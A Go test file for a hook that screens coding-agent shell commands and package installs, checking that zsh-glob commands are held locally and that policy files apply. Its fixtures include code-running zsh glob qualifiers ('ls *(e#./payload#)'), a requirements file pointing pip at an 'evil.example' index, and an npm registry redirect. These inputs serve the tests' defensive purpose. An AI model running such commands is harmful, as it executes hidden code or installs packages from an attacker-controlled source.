package main

import (
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
)

// Round 39: a line held only for the own shell's reason, with no install target (a zsh group on a word), never leaves
// the machine: the hook asks with the server's own reason. The fake server fails the test on any such line. A line
// with a target is sent as before.
func TestHookOwnShellOnlyAnsweredLocally(t *testing.T) {
	local := []string{"ls *(e#id#)", "echo foo(bar)", "git commit -m fix(parser): unquoted", "npm install; ls *(.)"}
	f := &fakeHook{answer: func(w http.ResponseWriter) {
		_, _ = w.Write([]byte(`{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"ask","permissionDecisionReason":"alalanet install_check: HOLD — new_package"}}`))
	}}
	srv := f.server(t)
	for _, cmd := range local {
		before := len(f.calls())
		out := runCodex(t, srv.URL, codexInput("Bash", cmd))
		if n := len(f.calls()) - before; n != 0 {
			t.Errorf("%q: sent to alalanet (%d requests): %v", cmd, n, f.calls()[before:])
		}
		if !strings.Contains(out, `"permissionDecision":"deny"`) || !strings.Contains(out, "NOT CHECKED. runs in the line's own shell what alalanet does not read") ||
			!strings.Contains(out, "confirm with the user") {
			t.Errorf("%q: answered %q; want the own shell's hold (a deny that says to confirm, Codex's ask)", cmd, out)
		}
	}
	// a requirements file the line names still holds, on top of the local answer (the file is read here, never sent)
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "r.txt"), []byte("--index-url https://evil.example/simple\nzz-pkg\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	in := strings.Replace(codexInput("Bash", "pip install -r r.txt; ls *(.)"), `"/home/dev/secret-project"`, strconv.Quote(dir), 1)
	before := len(f.calls())
	if out := runCodex(t, srv.URL, in); len(f.calls()) != before ||
		!strings.Contains(out, "NOT CHECKED. runs in the line's own shell") || !strings.Contains(out, "the line's local files") {
		t.Errorf("a requirements file and the own shell: sent %d, answered %q", len(f.calls())-before, out)
	}
	for _, cmd := range []string{"ls *(.); npm i left-pad", "npm i left-pad", "npm config set registry http://x.example; ls *(.)"} {
		before := len(f.calls())
		_ = runCodex(t, srv.URL, codexInput("Bash", cmd))
		if len(f.calls()) != before+1 {
			t.Errorf("%q: not sent", cmd)
		}
	}
}

// Batch P3 review 5, R-1: a line answered on the machine goes through the organisation's and the repository's policy
// as the server's answer for it would (ADR-0174): an on_hold deny denies it, an ask or an exception leaves the ask, a
// broken organisation's file is named; the line is still never sent, and the local files' hold is added on top of an ask.
func TestHookOwnShellLocalAnswerUnderPolicy(t *testing.T) {
	const askHolds = "version: 1\non_hold:\n  packages: ask\n"
	acme := "git@github.com:acme/app.git"
	for _, c := range []struct {
		name, origin, repo, managed, command string
		reqFile                              bool
		want, note, reason                   string
	}{
		{"no policy", "", "", "", "ls *(e#./payload#)", false, "hold", "", "runs in the line's own shell"},
		{"a repository's deny", "", denyHolds, "", "ls *(e#./payload#)", false, "deny", "denies", "runs in the line's own shell"},
		{"the organisation's deny", "", "", denyHolds, "echo foo(bar)", false, "deny", "denies", "runs in the line's own shell"},
		{"a repository's ask", "", askHolds, "", "ls *(e#./payload#)", false, "hold", "", "runs in the line's own shell"},
		{"the organisation's exceptions allow nothing here", acme, exceptOurs, trustAcme, "ls *(e#./payload#)", false, "hold", "", "runs in the line's own shell"},
		{"an unparsable organisation's file", "", "", "version: 7\n", "ls *(e#./payload#)", false, "hold", "is not a policy", "runs in the line's own shell"},
		{"a deny with a requirements file", "", denyHolds, "", "pip install -r r.txt; ls *(.)", true, "deny", "denies", "runs in the line's own shell"},
		{"an ask with a requirements file", "", askHolds, "", "pip install -r r.txt; ls *(.)", true, "hold", "", "the line's local files"},
	} {
		dir := workspace(t, c.origin, c.repo)
		if c.reqFile {
			write(t, filepath.Join(dir, "r.txt"), "--index-url https://evil.example/simple\nzz-pkg\n")
		}
		form, out, stderr, f := runWithPolicy(t, "claude-code", holdAnswer, managedFile(t, c.managed), codexInputIn(dir, c.command), nil)
		if n := len(f.calls()); n != 0 {
			t.Errorf("%s: sent to alalanet (%d requests)", c.name, n)
		}
		if form != c.want || !strings.Contains(out, c.reason) {
			t.Errorf("%s: %s %q, want %s with %q", c.name, form, out, c.want, c.reason)
		}
		if c.note != "" && !strings.Contains(stderr, c.note) {
			t.Errorf("%s: stderr %q lacks %q", c.name, stderr, c.note)
		}
		if c.note == "" && strings.Contains(stderr, "policy") {
			t.Errorf("%s: a policy note without cause: %q", c.name, stderr)
		}
	}
}
